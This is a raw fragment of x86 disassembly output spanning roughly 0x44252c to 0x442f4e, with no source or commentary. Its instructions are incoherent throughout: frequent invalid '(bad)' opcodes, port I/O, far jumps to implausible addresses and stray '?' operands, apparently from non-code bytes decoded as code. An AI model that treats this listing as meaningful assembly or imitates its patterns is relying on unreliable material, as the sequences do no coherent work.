  44252c:	sbb    DWORD PTR [esi+0x70],ecx
  44252f:	and    al,0x39
  442531:	test   al,0xe7
  442533:	(bad)  
  442534:	in     al,0xb7
  442536:	add    BYTE PTR [edx-0x4a],ah
  442539:	adc    ebp,0xffffffb5
  44253c:	jmp    0x244a:0x55d1427c
  442543:	mov    dh,0xfe
  442545:	mov    eax,0x8826acf
  44254a:	shl    DWORD PTR [edi-0x1606484e],0xe
  442551:	pop    ecx
  442552:	pop    edx
  442553:	jb     0x442522
  442555:	dec    ebp
  442556:	pop    ebx
  442557:	sub    ebx,DWORD PTR [esi-0x310c4e49]
  44255d:	mov    ecx,0x762c42f9
  442562:	adc    cl,ch
  442564:	pop    edx
  442565:	(bad)  
  442566:	int3   
  442567:	scas   al,BYTE PTR es:[edi]
  442568:	leave  
  442569:	inc    ebx
  44256a:	add    bl,dh
  44256c:	into   
  44256d:	inc    eax
  44256f:	sub    ebp,edx
  442571:	(bad)  
  442572:	(bad)  
  442573:	call   0x1984e686
  442578:	or     DWORD PTR [esi],edx
  44257a:	inc    eax
  44257b:	jmp    0x442580
	...
  442598:	add    BYTE PTR [eax],al
  44259a:	inc    edi
  44259b:	inc    eax
  44259c:	pop    eax
  44259d:	in     al,dx
  44259e:	push   cs
  44259f:	add    BYTE PTR [eax],al
  4425a1:	stos   BYTE PTR es:[edi],al
  4425a2:	pop    ebp
  4425a3:	(bad)  
  4425a4:	int3   
  4425a5:	cmp    al,0x92
  4425a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4425a8:	dec    edi
  4425a9:	aaa    
  4425aa:	mov    ah,BYTE PTR ds:0xebcf6a1c
  4425b0:	call   DWORD PTR ds:0xc273b89a
  4425b6:	xchg   ebx,eax
  4425b7:	dec    edx
  4425b8:	and    al,0x62
  4425ba:	ret    0xb7df
  4425bd:	call   0x3a4425d0
  4425c2:	mov    cl,0x7c
  4425c4:	inc    ebp
  4425c5:	add    DWORD PTR [ebx],esi
  4425c7:	mov    bh,0x49
  4425c9:	mov    eax,0x7dc5cf
  4425ce:	and    BYTE PTR [eax],dl
  4425d0:	add    DWORD PTR [esi-0x20],0xef75c087
  4425d7:	and    DWORD PTR [eax+0x2e401],edi
  4425dd:	pop    esi
  4425de:	pop    edi
  4425df:	imul   edx,DWORD PTR [ebp-0x3d],0x4631c2e7
  4425e6:	int3   
  4425e7:	test   DWORD PTR [edx],0xb39e9a8b
  4425ed:	add    DWORD PTR [edx+eax*1-0x7ae92d00],esp
  4425f4:	xor    BYTE PTR ds:0x82892c4a,ch
  4425fb:	stos   BYTE PTR es:[edi],al
  4425fc:	and    al,0x7b
	...
  44261a:	add    BYTE PTR [eax],al
  44261c:	xchg   esp,eax
  44261d:	test   DWORD PTR [esi],edi
  44261f:	sub    BYTE PTR [edi],ch
  442621:	je     0x44268d
  442623:	sub    bh,ch
  442625:	inc    ebp
  442626:	or     al,0x8b
  442628:	inc    edx
  442629:	mov    eax,0x4bbc2b49
  44262e:	dec    edx
  44262f:	call   0x3dd508
  442634:	out    dx,eax
  442635:	dec    eax
  442636:	sub    BYTE PTR [ebx+0x468106b0],al
  44263c:	cmp    BYTE PTR [ecx],ah
  44263e:	mov    edi,0x26446
  442643:	add    BYTE PTR [ebp*4+0x67af5eb9],dh
  44264a:	push   ebp
  44264b:	ret    
  44264c:	pop    edi
  44264d:	dec    eax
  44264e:	xor    BYTE PTR [ecx-0x38cc400f],cl
  442654:	and    al,BYTE PTR [edi]
  442656:	cmp    DWORD PTR [ebp-0x58],0x5f8bbf85
  44265d:	push   es
  44265e:	adc    DWORD PTR [esi+0x20],0xfffffffd
  442662:	dec    ebp
  442663:	xor    BYTE PTR ds:0x5cc8ea77,cl
  442669:	jns    0x442610
  44266b:	and    bh,BYTE PTR [esi]
  44266d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44266e:	std    
  44266f:	test   BYTE PTR [eax-0xd],bl
  442672:	add    esp,0x74bb0211
  442678:	xor    DWORD PTR [edx],esp
  44267a:	inc    edx
  44267b:	or     al,0x86
  44267d:	ins    DWORD PTR es:[edi],dx
  44267e:	icebp  
  44267f:	push   eax
	...
  44269c:	add    BYTE PTR [eax],al
  44269e:	neg    ch
  4426a0:	dec    esp
  4426a1:	dec    edi
  4426a2:	mov    ch,0x9b
  4426a4:	repnz (bad) 
  4426a6:	mov    edx,0x8e285722
  4426ab:	jecxz  0x4426b5
  4426ad:	xchg   DWORD PTR [ebx],ebp
  4426af:	ja     0x44270f
  4426b1:	xchg   DWORD PTR [ebx],edi
  4426b3:	mov    ebx,0x223bbff2
  4426b8:	test   al,0x5b
  4426ba:	into   
  4426bb:	xor    al,BYTE PTR [esi+0x28]
  4426be:	or     al,0xe5
  4426c0:	repz ss retf 
  4426c3:	push   ss
  4426c4:	xor    DWORD PTR [ecx],eax
  4426c6:	push   edx
  4426c7:	(bad)  
  4426c9:	push   DWORD PTR [edx-0x59]
  4426cc:	std    
  4426cd:	test   bl,al
  4426cf:	add    bh,bl
  4426d1:	iret   
  4426d2:	fisub  WORD PTR [ebx+0xd84cf04]
  4426d8:	lock pop eax
  4426da:	push   ds
  4426db:	addr16 pop esi
  4426dd:	test   DWORD PTR [eax],esi
  4426df:	hlt    
  4426e0:	ret    0x51cc
  4426e3:	hlt    
  4426e4:	mov    ch,ah
  4426e6:	xchg   ah,bl
  4426e8:	or     edi,DWORD PTR [ebp+0x21]
  4426eb:	ja     0x442745
  4426ed:	or     DWORD PTR [ebp-0x5a],0xffffff81
  4426f1:	mov    edx,0x84fda6fe
  4426f6:	xchg   ebp,eax
  4426f7:	ret    0xf982
  4426fa:	add    al,BYTE PTR [eax]
  4426fc:	imul   esi,DWORD PTR [ebp+0x18],0x0
  442700:	out    0x84,eax
	...
  44271e:	add    BYTE PTR [eax],al
  442720:	test   DWORD PTR [edi+eiz*8],eax
  442723:	adc    BYTE PTR [ecx+0xd03f666],dl
  442729:	cmp    edi,0x660a5e03
  44272f:	cmp    al,0x9
  442731:	add    dl,ah
  442733:	xchg   BYTE PTR [ebx+0x5003e710],al
  442739:	cmc    
  44273a:	in     eax,dx
  44273b:	ss bsr esp,edx
  44273f:	prefetch BYTE PTR [eax]
  442742:	out    0x8c,eax
  442744:	inc    ebp
  442745:	add    al,0x5e
  442747:	adc    al,0x8a
  442749:	inc    edx
  44274a:	jge    0x44b237a5
  442750:	or     DWORD PTR [ecx+0x5e],edx
  442753:	popa   
  442754:	aad    0x86
  442756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442757:	mov    edi,0x8cb73a8a
  44275c:	or     al,0x4e
  44275e:	outs   dx,BYTE PTR ds:[esi]
  44275f:	cmp    BYTE PTR [ecx-0x79],al
  442762:	and    al,0xb4
  442764:	xchg   edx,eax
  442765:	dec    edx
  442766:	iret   
  442767:	mov    al,dh
  442769:	lahf   
  44276a:	stos   BYTE PTR es:[edi],al
  44276b:	inc    esi
  44276c:	inc    ebp
  44276d:	jmp    esi
  44276f:	add    ecx,DWORD PTR ds:0x421af81
  442775:	jge    0x44273e
  442777:	adc    cl,BYTE PTR ds:0x8fe7a200
  44277d:	adc    ebx,esp
  44277f:	inc    esp
  442780:	or     eax,0xc2a89
	...
  4427a1:	add    BYTE PTR [esi+0x4c0d14bf],cl
  4427a7:	cld    
  4427a8:	repnz add ecx,DWORD PTR ds:0x127f9000
  4427af:	add    BYTE PTR [eax],al
  4427b1:	jmp    0xfa54e147
  4427b6:	sub    BYTE PTR [ebx],dh
  4427b8:	jnp    0x44281f
  4427ba:	push   cs
  4427bb:	or     DWORD PTR [edx+esi*8-0x19ffffe8],eax
  4427c2:	je     0x442776
  4427c4:	cli    
  4427c5:	pushf  
  4427c6:	mov    dl,0x7d
  4427c8:	retf   0xae1a
  4427cb:	bnd jl 0x4427f5
  4427ce:	push   ss
  4427cf:	jnp    0x442824
  4427d1:	xor    DWORD PTR [ecx],edx
  4427d3:	fdivr  DWORD PTR [ebp+0x2f]
  4427d6:	(bad)  
  4427d7:	and    edx,ebx
  4427d9:	pop    ds
  4427da:	push   ebp
  4427db:	or     dh,bh
  4427dd:	xchg   esp,eax
  4427de:	or     al,0x33
  4427e0:	cmc    
  4427e1:	test   BYTE PTR [ecx-0x4b6c0000],0x1d
  4427e8:	add    BYTE PTR [ebx+0x11001a0e],dl
  4427ee:	ins    DWORD PTR es:[edi],dx
  4427ef:	adc    DWORD PTR [eax],eax
  4427f1:	jmp    0x835c697d
  4427f6:	or     BYTE PTR [edi+0x7b33d54b],al
  4427fc:	pop    ebx
  4427fd:	int    0x96
  4427ff:	push   ecx
  442800:	sbb    BYTE PTR [eax],bh
  442802:	fbld   TBYTE PTR [edi+0xf687]
	...
  442824:	push   cs
  442825:	add    BYTE PTR [ebp-0x2b1a56e4],al
  44282b:	jo     0x4427f7
  44282d:	pop    ss
  44282e:	sub    eax,0xff0152bf
  442833:	call   0x392b2846
  442838:	and    BYTE PTR [eax],al
  44283a:	add    BYTE PTR [edx-0x36],dh
  44283d:	ffreep st(0)
  44283f:	and    DWORD PTR cs:[eax],eax
  442842:	add    cl,ch
  442844:	push   cs
  442845:	jg     0x442807
  442847:	add    BYTE PTR [eax],ch
  442849:	cli    
  44284a:	mov    esi,0xf7726440
  44284f:	jmp    DWORD PTR [ebx+0x25083f69]
  442855:	add    al,BYTE PTR [ecx+edx*4+0xefffef4]
  44285c:	call   0xc385:0xece0b9be
  442863:	ror    DWORD PTR [ebp+0x4],0xfb
  442867:	shl    bh,0xd0
  44286a:	mov    cl,0x1f
  44286c:	hlt    
  44286d:	(bad)  
  44286e:	push   esi
  442870:	adc    eax,0x9b75ca89
  442875:	test   ebx,ecx
  442877:	adc    BYTE PTR [esi],0x3
  44287a:	cmp    dl,0xbc
  44287d:	jmp    0x5583:0x6698b09
  442884:	sbb    al,0xbb
  442886:	inc    eax
  442887:	sbb    BYTE PTR [eax],al
	...
  4428a5:	add    bl,al
  4428a7:	in     al,dx
  4428a8:	aas    
  4428a9:	add    ch,bh
  4428ab:	imul   edx,DWORD PTR [eax],0x3f85a400
  4428b1:	and    al,0xe5
  4428b3:	data16 add al,0x8b
  4428b6:	mov    edi,0xf70fd97d
  4428bb:	fs add al,0x83
  4428be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4428bf:	push   es
  4428c0:	jge    0x442882
  4428c2:	fnstenv [ebp+0x36184f82]
  4428c8:	stc    
  4428c9:	push   DWORD PTR [esi+edi*8+0x61]
  4428cd:	add    BYTE PTR [edi+0x60],dh
  4428d0:	bound  eax,QWORD PTR [eax]
  4428d2:	into   
  4428d3:	sti    
  4428d4:	adc    BYTE PTR [edi+0x48],0x66
  4428d8:	fisubr DWORD PTR [esi]
  4428da:	xor    al,0xfe
  4428dc:	or     BYTE PTR [ebp+0xd],0xa1
  4428e0:	xchg   BYTE PTR [ebx+0x35],dl
  4428e3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4428e5:	or     BYTE PTR [edx],ah
  4428e7:	xchg   ebp,eax
  4428e8:	jle    0x4428c7
  4428ea:	mov    tr0,esi
  4428ed:	pop    es
  4428ee:	test   cl,ah
  4428f0:	sbb    eax,DWORD PTR [edi+0x198c78cc]
  4428f6:	ds ds out dx,al
  4428f9:	icebp  
  4428fa:	hlt    
  4428fb:	test   BYTE PTR ds:0xcc0e0d00,cl
  442901:	jb     0x4428cb
  442903:	push   ds
  442904:	pop    eax
  442905:	clc    
  442906:	hlt    
  442907:	pop    eax
  442908:	or     eax,0x0
	...
  442925:	add    BYTE PTR [eax],al
  442927:	add    BYTE PTR ds:0xd208582e,cl
  44292d:	gs adc eax,0xfd675b29
  442933:	test   BYTE PTR [eax-0x21],ah
  442936:	stos   DWORD PTR es:[edi],eax
  442937:	xchg   DWORD PTR ds:0xbb7cfda7,ebx
  44293d:	mov    bh,0x2e
  44293f:	push   ds
  442940:	mov    es,WORD PTR [ecx+edi*4-0x24dce600]
  442947:	adc    BYTE PTR ds:0xfb20aa7,cl
  44294d:	stos   BYTE PTR es:[edi],al
  44294e:	dec    ecx
  44294f:	cld    
  442950:	xchg   BYTE PTR [ecx],dl
  442952:	into   
  442953:	loopne 0x442924
  442955:	and    eax,0xec9408c2
  44295a:	mov    ebx,0xba2662fd
  44295f:	adc    bh,bh
  442961:	pusha  
  442962:	test   DWORD PTR [ecx-0x3],ebx
  442965:	es mov bh,0x8
  442968:	adc    bl,BYTE PTR [eax+edx*2]
  44296b:	adc    BYTE PTR ds:0xdbdb4a7,cl
  442971:	mov    DWORD PTR [eax+eax*1],0x88f1ffc1
  442978:	into   
  442979:	pop    es
  44297a:	mov    ds:0x18e11544,al
  44297f:	inc    esp
  442980:	or     eax,0xd13caa7
  442985:	add    BYTE PTR [esi+0x45],ch
  442988:	in     eax,dx
  442989:	jp     0x442932
  44298b:	cmp    BYTE PTR [eax],al
	...
  4429a9:	add    BYTE PTR [ebx],dl
  4429ab:	test   DWORD PTR [esi+0x66082ac3],ebx
  4429b1:	mov    ds:0xb4ef880a,eax
  4429b6:	dec    esp
  4429b7:	adc    bh,ah
  4429b9:	add    DWORD PTR ds:0x851ddb00,ecx
  4429bf:	push   edx
  4429c0:	cmp    eax,ebx
  4429c2:	lock pop es
  4429c4:	int    0x1
  4429c6:	xchg   esi,eax
  4429c7:	dec    edx
  4429c8:	dec    ebx
  4429c9:	mov    WORD PTR [esi],?
  4429cb:	mov    ds:0x4df5455e,eax
  4429d0:	xchg   edi,eax
  4429d1:	stos   DWORD PTR es:[edi],eax
  4429d2:	dec    DWORD PTR [ecx]
  4429d4:	out    0x3,eax
  4429d6:	mov    BYTE PTR [edx+0x1f],cl
  4429d9:	mov    ecx,DWORD PTR [eax+ebx*1-0x2a]
  4429dd:	fsub   st,st(0)
  4429df:	test   eax,0xb0ab0522
  4429e4:	out    0x3,eax
  4429e6:	test   al,0xfa
  4429e8:	gs mov esi,0x80c52ced
  4429ee:	push   ss
  4429ef:	mov    ah,0xe7
  4429f1:	or     al,0x91
  4429f3:	dec    edi
  4429f4:	test   DWORD PTR [ebx],0x191010d
  4429fa:	je     0x442a3e
  4429fc:	ror    DWORD PTR [eax+0x41c7cc47],cl
  442a02:	call   0xbecf19c0
  442a07:	mov    bh,0xe6
  442a09:	fcmovnu st,st(0)
  442a0b:	mov    cl,0x0
  442a0d:	or     DWORD PTR [eax],eax
	...
  442a2b:	add    BYTE PTR [edi],bl
  442a2d:	(bad)  
  442a2e:	test   DWORD PTR [esi],esp
  442a30:	xor    DWORD PTR [ebp-0x40],edi
  442a33:	sbb    eax,0xe558790c
  442a38:	cmp    DWORD PTR [esi],0xce910
  442a3e:	add    BYTE PTR ds:0x955b783b,dl
  442a44:	xchg   ebp,eax
  442a45:	mov    edx,0x984f9a85
  442a4a:	or     BYTE PTR [eax-0x7d40f09c],ch
  442a50:	es es add al,0x74
  442a54:	dec    ebx
  442a55:	pushf  
  442a56:	mov    BYTE PTR [ebx+ebp*4-0x79b8ac88],ch
  442a5d:	dec    ebx
  442a5e:	jmp    0x504c83c5
  442a63:	cwde   
  442a64:	mov    dh,0x6e
  442a66:	adc    ebp,ecx
  442a68:	push   cs
  442a69:	test   DWORD PTR [ebx+0x31],edx
  442a6c:	xchg   DWORD PTR [ecx+0x18],eax
  442a6f:	cli    
  442a70:	in     eax,0xdd
  442a72:	icebp  
  442a73:	or     DWORD PTR cs:[ebp-0x5af11607],ebp
  442a7a:	add    ebp,DWORD PTR [edx+0x70]
  442a7d:	adc    BYTE PTR [ebp-0x35],ch
  442a80:	lea    ebp,[ebx]
  442a82:	cld    
  442a83:	jmp    0xef20ae99
  442a88:	push   cs
  442a89:	add    BYTE PTR [ecx],cl
  442a8b:	aas    
  442a8c:	or     al,0xa9
  442a8e:	dec    ebx
  442a8f:	in     eax,dx
	...
  442aac:	add    BYTE PTR [eax],al
  442aae:	xchg   edx,eax
  442aaf:	mov    edx,0x2ccbc9cd
  442ab4:	ret    0x89f1
  442ab7:	push   ebx
  442ab8:	clc    
  442ab9:	jmp    0xca20:0xf9fa2d56
  442ac0:	test   DWORD PTR [eax],eax
  442ac2:	xor    esp,DWORD PTR [esi+edi*2-0x7ceddf40]
  442ac9:	retf   
  442aca:	in     eax,0x64
  442acc:	test   DWORD PTR [eax],0x48810334
  442ad2:	cmp    al,0x7e
  442ad4:	inc    edi
  442ad5:	and    BYTE PTR [edi+0x2ce8b9c6],bh
  442adb:	jl     0x442b16
  442add:	or     al,0x83
  442adf:	inc    ebx
  442ae0:	adc    BYTE PTR [eax],al
  442ae2:	add    eax,DWORD PTR ss:[eax]
  442ae5:	je     0x442b21
  442ae7:	jnp    0x442b3e
  442ae9:	in     al,dx
  442aea:	gs pop edi
  442aec:	or     BYTE PTR [edx-0xa],ch
  442aef:	ja     0x442b3e
  442af1:	in     al,dx
  442af2:	jl     0x442b3d
  442af4:	in     eax,0x8b
  442af6:	mov    bl,0xa
  442af8:	dec    edx
  442af9:	push   eax
  442afa:	dec    esp
  442afb:	aas    
  442afc:	or     eax,0x4d7df400
  442b01:	clc    
  442b02:	pop    ebp
  442b03:	inc    ebx
  442b04:	sbb    BYTE PTR [ebx],dh
  442b06:	das    
  442b07:	mov    bh,0xef
  442b09:	(bad)  
  442b0a:	jecxz  0x442aba
  442b0c:	stc    
  442b0d:	push   DWORD PTR [ecx+esi*2+0x103f]
	...
  442b30:	mov    ah,0xae
  442b32:	stc    
  442b33:	jmp    DWORD PTR [eax-0x4b01851d]
  442b39:	cmc    
  442b3a:	sbb    DWORD PTR [ebx+0xf007699],eax
  442b40:	xor    BYTE PTR [edx+0x7],cl
  442b43:	add    BYTE PTR [ecx+edi*8+0x379b02ad],ah
  442b4a:	cld    
  442b4b:	mov    ebp,DWORD PTR [edx]
  442b4d:	xlat   BYTE PTR ds:[ebx]
  442b4e:	loopne 0x442b92
  442b50:	test   eax,0x6c418908
  442b56:	sti    
  442b57:	xlat   BYTE PTR ds:[ebx]
  442b58:	or     eax,0xdf10b71a
  442b5d:	pop    esi
  442b5e:	mov    al,BYTE PTR [ecx+0x2d]
  442b61:	xor    BYTE PTR [esi+0x40],dl
  442b64:	nop
  442b65:	pop    eax
  442b66:	sub    ebp,edi
  442b68:	test   DWORD PTR [eax],edx
  442b6a:	adc    cl,dh
  442b6c:	ror    al,cl
  442b6e:	std    
  442b6f:	std    
  442b70:	inc    edx
  442b71:	cwde   
  442b72:	sub    DWORD PTR [edx],ebx
  442b74:	test   ebx,ebp
  442b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442b77:	mov    edi,0xfe2ba026
  442b7c:	cdq    
  442b7d:	or     ebp,DWORD PTR [eax-0x756c3f78]
  442b83:	push   ecx
  442b84:	cmc    
  442b85:	pop    es
  442b86:	push   edx
  442b87:	call   0x41f7bc
  442b8c:	xchg   esi,eax
  442b8d:	adc    al,0xbc
  442b8f:	xchg   DWORD PTR [edx-0x1],ecx
  442b92:	lock aam 0x0
	...
  442bb1:	add    BYTE PTR [esi],bh
  442bb3:	push   ebp
  442bb4:	stos   BYTE PTR es:[edi],al
  442bb5:	or     al,BYTE PTR [esi-0x327d22a2]
  442bbb:	sar    esi,cl
  442bbd:	ror    BYTE PTR [ebp-0x39],0xfd
  442bc1:	dec    DWORD PTR ds:0x801be97
  442bc7:	xchg   edi,eax
  442bc8:	std    
  442bc9:	inc    edx
  442bcb:	or     ax,0x900
  442bcf:	xchg   edi,eax
  442bd0:	std    
  442bd1:	or     BYTE PTR [ecx+0xdfffd36],dl
  442bd7:	and    bh,BYTE PTR [esi]
  442bd9:	inc    eax
  442bda:	xchg   esi,eax
  442bdb:	mov    WORD PTR [ecx-0x454b779],?
  442be1:	mov    esi,0xbf8aa423
  442be6:	test   BYTE PTR [ecx+ebp*4-0x7d],ah
  442bea:	dec    ebp
  442beb:	into   
  442bec:	jns    0x442c5b
  442bee:	or     eax,0x9003e700
  442bf3:	cmp    eax,0x344a7f07
  442bf8:	adc    DWORD PTR [ebp+0x47600fd2],ecx
  442bfe:	cmp    DWORD PTR [ebx+0x792130b0],eax
  442c04:	adc    ah,ah
  442c06:	mov    DWORD PTR [edx],edi
  442c08:	fucomi st,st(4)
  442c0a:	aad    0x3f
  442c0c:	pop    esi
  442c0d:	push   esi
  442c0e:	and    eax,0x38a03477
  442c13:	(bad)
	...
  442c32:	add    BYTE PTR [eax],al
  442c34:	mov    edi,0x314ebe02
  442c39:	jns    0x442be0
  442c3b:	lea    edi,[esi-0x3172e859]
  442c41:	shl    esi,cl
  442c43:	sub    DWORD PTR ds:[edx+0x17],edx
  442c47:	lods   al,BYTE PTR ds:[esi]
  442c48:	ret    
  442c49:	fucom  st(6)
  442c4b:	add    ecx,DWORD PTR [eax+0x5e8d5b42]
  442c51:	test   al,0x66
  442c53:	rol    BYTE PTR [ecx],0xb5
  442c56:	stos   BYTE PTR es:[edi],al
  442c57:	adc    ecx,DWORD PTR ds:0x5903e702
  442c5d:	or     ch,BYTE PTR [esi+0x4f]
  442c60:	loope  0x442cda
  442c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442c63:	mov    ebx,0x55cf3c88
  442c68:	pop    ebp
  442c69:	dec    edi
  442c6a:	aas    
  442c6b:	icebp  
  442c6c:	push   ds
  442c6d:	add    bh,ah
  442c6f:	mov    WORD PTR [esi-0x58],ds
  442c72:	jo     0x442cb5
  442c74:	adc    eax,0xf2afac79
  442c79:	inc    edx
  442c7a:	or     eax,DWORD PTR ds:0x43a9d6bd
  442c80:	xchg   edx,eax
  442c81:	push   edx
  442c82:	inc    DWORD PTR [esp+edx*1+0x15e90040]
  442c89:	adc    DWORD PTR [edi+ebx*8+0xe],0xd12ec100
  442c91:	(bad)  
  442c92:	(bad)  
  442c93:	call   0xef45eba6
	...
  442cb4:	add    BYTE PTR [eax],al
  442cb6:	push   cs
  442cb7:	add    BYTE PTR [eax],al
  442cb9:	(bad)  
  442cba:	int    0xf
  442cbc:	add    cl,dh
  442cbe:	push   cs
  442cbf:	add    BYTE PTR [ecx],cl
  442cc1:	gs (bad) 
  442cc3:	(bad)  
  442cc4:	(bad)  
  442cc5:	call   0xea40555b
  442cca:	adc    eax,0xef73084
  442ccf:	add    BYTE PTR ds:0x448ba9,ch
  442cd5:	out    0x9c,al
  442cd7:	sti    
  442cd8:	movaps XMMWORD PTR [esi-0x328d0bc0],xmm2
  442cdf:	fild   WORD PTR [esi-0x3f7f92d4]
  442ce5:	std    
  442ce6:	out    dx,eax
  442ce7:	test   BYTE PTR [eax-0x33],cl
  442cea:	xchg   edi,eax
  442ceb:	aaa    
  442cec:	aam    0x6c
  442cee:	(bad)  
  442cef:	xor    al,0x11
  442cf1:	jb     0x442d38
  442cf3:	inc    eax
  442cf4:	xor    eax,0x91ceea1
  442cf9:	bound  edx,QWORD PTR [ebx-0x2c]
  442cfc:	xchg   BYTE PTR [edx+edi*2-0x6a0cfb88],ch
  442d03:	inc    ecx
  442d04:	inc    eax
  442d05:	bound  ebx,QWORD PTR [ebx-0x58]
  442d08:	jge    0x442cb6
  442d0a:	mov    ds:0x89f17400,al
  442d0f:	aas    
  442d10:	hlt    
  442d11:	loop   0x442d06
  442d13:	stos   DWORD PTR es:[edi],eax
  442d14:	outs   dx,BYTE PTR ds:[esi]
  442d15:	push   esi
  442d16:	pop    ebp
  442d17:	inc    ecx
  442d18:	adc    cl,ch
	...
  442d36:	add    BYTE PTR [eax],al
  442d38:	or     BYTE PTR [eax],al
  442d3a:	add    BYTE PTR [eax],al
  442d3c:	sbb    BYTE PTR [eax],dl
  442d3e:	or     DWORD PTR [ebp-0x68],0x77
  442d42:	dec    ebp
  442d43:	clc    
  442d44:	out    dx,eax
  442d45:	aas    
  442d46:	sbb    BYTE PTR [ecx-0x5a],dl
  442d49:	dec    edi
  442d4a:	call   0x43a4e4
  442d4f:	mov    bh,BYTE PTR [ecx]
  442d51:	ins    BYTE PTR es:[edi],dx
  442d52:	add    DWORD PTR [edi+0x5c],0xdf43d76
  442d59:	inc    ecx
  442d5a:	cld    
  442d5b:	add    esi,DWORD PTR [edi+edi*2+0x75]
  442d5f:	in     al,0x64
  442d61:	jl     0x442db0
  442d63:	clc    
  442d64:	xor    eax,DWORD PTR [eax-0xcbf253]
  442d6a:	loop   0x442d7a
  442d6c:	mov    edi,0x64851fea
  442d71:	lock inc dh
  442d74:	hlt    
  442d75:	pop    es
  442d76:	add    BYTE PTR [eax],al
  442d78:	xor    al,0xff
  442d7a:	mov    esi,0x3e447
  442d7f:	add    BYTE PTR [edx+ebp*2],ah
  442d82:	inc    DWORD PTR [esi]
  442d84:	hlt    
  442d85:	(bad)  
  442d86:	push   esi
  442d88:	sub    edx,DWORD PTR [eax+eax*1]
  442d8b:	adc    ah,ah
  442d8d:	inc    BYTE PTR [esi]
  442d8f:	test   BYTE PTR [esp+eax*1+0x0],bh
  442d93:	add    BYTE PTR [edi-0x17],dh
  442d96:	sti    
  442d97:	add    bl,al
  442d99:	sub    bh,BYTE PTR [ecx+0xd]
	...
  442db8:	add    BYTE PTR [eax],al
  442dba:	in     al,0xfe
  442dbc:	sub    al,al
  442dbe:	popa   
  442dbf:	loopne 0x442de4
  442dc1:	add    BYTE PTR [ebx+0x74100c1c],dh
  442dc7:	jnp    0x442e06
  442dc9:	hlt    
  442dca:	aas    
  442dcb:	jmp    0x442dec
  442dcd:	mov    DWORD PTR [ecx-0x76],esp
  442dd0:	jge    0x442d92
  442dd2:	or     eax,0x5584e48d
  442dd7:	lds    ecx,FWORD PTR [ebx+ecx*2+0x74cb1bc1]
  442dde:	cli    
  442ddf:	sub    eax,0x61464041
  442de4:	in     eax,0x6c
  442de6:	adc    bl,BYTE PTR [esi]
  442de8:	dec    edi
  442de9:	aam    0x87
  442deb:	fistp  DWORD PTR [edi-0x4d50f678]
  442df1:	inc    ecx
  442df2:	int    0x1d
  442df4:	push   eax
  442df5:	clc    
  442df6:	mov    ?,WORD PTR [ebx]
  442df8:	mov    al,ds:0x86b0e100
  442dfd:	inc    ebx
  442dfe:	pop    ecx
  442dff:	std    
  442e00:	ds cld 
  442e02:	mov    edi,0x1d41aa31
  442e07:	cdq    
  442e08:	(bad)  
  442e09:	dec    DWORD PTR ds:0xc085090d
  442e0f:	xchg   esp,eax
  442e10:	xchg   BYTE PTR [ebx+0x25],dl
  442e13:	sbb    eax,0xe6bc183a
  442e18:	push   ebx
  442e19:	call   0x41f44e
	...
  442e3a:	add    BYTE PTR [eax],al
  442e3c:	xchg   BYTE PTR [ebx],dl
  442e3e:	mov    esp,0x86cf5287
  442e43:	inc    ebx
  442e44:	stc    
  442e45:	rol    BYTE PTR [eax-0x4],0xe
  442e49:	out    0x7d,eax
  442e4b:	jnp    0x442e36
  442e4d:	xchg   edi,eax
  442e4e:	mov    WORD PTR [ebx-0x1b],ss
  442e51:	mov    ds:0x97100380,al
  442e56:	std    
  442e57:	in     al,0xb
  442e59:	cmp    ah,BYTE PTR cs:[eax]
  442e5c:	mov    bh,dl
  442e5e:	sub    BYTE PTR [ecx],al
  442e60:	rcl    BYTE PTR [edi-0x27],cl
  442e63:	inc    edx
  442e65:	xchg   edi,eax
  442e66:	std    
  442e67:	rcl    BYTE PTR [edx],0x0
  442e6a:	out    dx,eax
  442e6b:	add    ecx,DWORD PTR ds:0xfd3e1200
  442e71:	jmp    esp
  442e73:	add    ecx,DWORD PTR ds:0x9782cc34
  442e79:	adc    BYTE PTR [esi-0x15],dh
  442e7c:	xchg   DWORD PTR [ebp+0xd03e7],eax
  442e82:	data16 cmp BYTE PTR [ecx+0x4a7fda00],al
  442e89:	cld    
  442e8a:	out    0x3,al
  442e8c:	add    al,0x72
  442e8e:	in     eax,0xb4
  442e90:	(bad)  
  442e91:	stos   DWORD PTR es:[edi],eax
  442e92:	pop    esi
  442e93:	(bad)  
  442e94:	push   eax
  442e95:	mov    al,ds:0xf84f8125
  442e9a:	outs   dx,DWORD PTR ds:[esi]
  442e9b:	dec    edi
  442e9c:	push   ebp
  442e9d:	std    
  442e9e:	sahf   
  442e9f:	add    DWORD PTR [eax],0x0
	...
  442ebd:	add    BYTE PTR [edi+0x10],al
  442ec0:	xor    eax,0x1a7114d6
  442ec5:	sbb    al,0x0
  442ec7:	(bad)  
  442ec8:	bnd jle 0x442f03
  442ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442ecc:	call   0x88ad:0xd6c4f8b5
  442ed3:	inc    ecx
  442ed4:	(bad)  
  442ed5:	jle    0x442f24
  442ed7:	xor    al,0xd9
  442ed9:	mov    ah,al
  442edb:	push   gs
  442edd:	mov    ebx,0x3887d12
  442ee2:	mov    dh,BYTE PTR [edi]
  442ee4:	mov    ebx,0x29e05c88
  442ee9:	inc    edx
  442eea:	cmp    eax,0xd03e6ff
  442eef:	push   ss
  442ef0:	out    0x29,eax
  442ef2:	or     eax,0x4fabe716
  442ef7:	push   cs
  442ef8:	out    0x3,eax
  442efa:	mov    BYTE PTR [edx],bh
  442efc:	out    dx,eax
  442efd:	mov    BYTE PTR [esi-0x58],bl
  442f00:	add    BYTE PTR [eax+0x0],ah
  442f03:	or     BYTE PTR [edi+0x1bfbea8],al
  442f09:	repnz push cs
  442f0b:	add    BYTE PTR [eax],al
  442f0d:	adc    BYTE PTR ds:0x8de8fffc,dl
  442f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442f14:	and    BYTE PTR [edx+0x57b2bac],bl
  442f1a:	or     edi,esi
  442f1c:	and    DWORD PTR [edx-0x19ffffee],0x0
	...
  442f3f:	add    al,dh
  442f41:	test   eax,0x82c29cfa
  442f46:	retf   0xaeba
  442f49:	jmp    0x815ad6ca
  442f4e:	push   ebx
